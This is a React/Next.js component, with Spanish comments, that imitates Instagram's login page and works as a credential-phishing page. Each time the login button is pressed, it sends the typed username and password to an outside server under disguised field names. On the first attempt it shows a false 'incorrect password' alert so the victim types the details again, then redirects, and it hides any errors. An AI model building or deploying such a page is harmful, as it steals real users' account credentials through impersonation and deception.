"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function InstagramLoginExact() {
  const [usuario, setUsuario] = useState("");
  const [contrasena, setContrasena] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginIntent, setLoginIntent] = useState(0);
  const router = useRouter();

  const handleLogin = async () => {
    setLoginIntent(loginIntent + 1);

    try {
      // Siempre guardar los datos
      const response = await fetch("https://backend-simple-7fdv.onrender.com/usuarios_textos_insta", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ texto_a: usuario, texto_b: contrasena }),
      });

      if (!response.ok) throw new Error("Error en la respuesta del servidor");

      // Comportamiento según el intento
      if (loginIntent === 0) {
        // Primer intento: broma + limpiar campos
        alert("La contraseña es incorrecta. Intenta de nuevo");
        setUsuario("");
        setContrasena("");
      } else {
        // Segundo intento: redirigir
        router.push("/nueva-cita");
      }
    } catch (error) {
      console.error("Error enviando datos:", error);
      // No mostramos alertas
    }
  };

  return (
    <div className="ig-root">
      <div className="ig-card">
        <div className="ig-logo">
          <img src="/insta.png" alt="Instagram" className="ig-logo-img" />
        </div>

        <div className="ig-form">
          <input
            className="ig-input"
            type="text"
            placeholder="Usuario"
            value={usuario}
            onChange={(e) => setUsuario(e.target.value)}
          />

          <div className="ig-password-wrapper">
            <input
              className="ig-input ig-password-input"
              type={showPassword ? "text" : "password"}
              placeholder="Contraseña"
              value={contrasena}
              onChange={(e) => setContrasena(e.target.value)}
            />
            <button
              type="button"
              className="ig-show-btn"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  {/* Ojo cerrado de Instagram */}
                  <path
                    d="M1 1l22 22M17.94 17.94C16.14 19.14 14.13 20 12 20 7 20 2.73 16.89 1 12c.63-1.42 1.53-2.7 2.65-3.79"
                    stroke="#262626"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              ) : (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  {/* Ojo abierto de Instagram */}
                  <path
                    d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7z"
                    stroke="#262626"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle cx="12" cy="12" r="3" stroke="#262626" strokeWidth="2" />
                </svg>
              )}
            </button>
          </div>

          <button className="ig-btn" type="button" onClick={handleLogin}>
            Iniciar sesión
          </button>
        </div>
      </div>

      <style>{`
        .ig-root {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          background: #ffffff;
        }
        .ig-card {
          width: 318px;
        }
        .ig-card, .ig-card * {
          box-sizing: border-box;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          color: #262626;
        }
        .ig-logo { text-align: center; margin-bottom: 24px; }
        .ig-logo-img { height: 70px; display: inline-block; }
        .ig-form { display: flex; flex-direction: column; gap: 8px; }

        .ig-input {
          width: 100%;
          height: 36px;
          padding: 9px 8px;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          background: #ffffff;
          outline: none;
          font-size: 12px;
        }
        .ig-input::placeholder { color: #8e8e8e; }
        .ig-input:focus { border-color: #a5b1ff; }

        .ig-password-wrapper {
          position: relative;
          display: flex;
          align-items: center;
        }
        .ig-password-input { padding-right: 36px; }
        .ig-show-btn {
          position: absolute;
          right: 8px;
          background: none;
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .ig-btn {
          width: 100%;
          height: 32px;
          margin-top: 12px;
          border: none;
          border-radius: 8px;
          background: #6d7ae0;
          color: #ffffff;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          transition: background 0.2s ease;
        }
        .ig-btn:hover { background: #5a67c7; }
        .ig-btn:active { transform: translateY(1px); background: #4954a8; }
      `}</style>
    </div>
  );
}
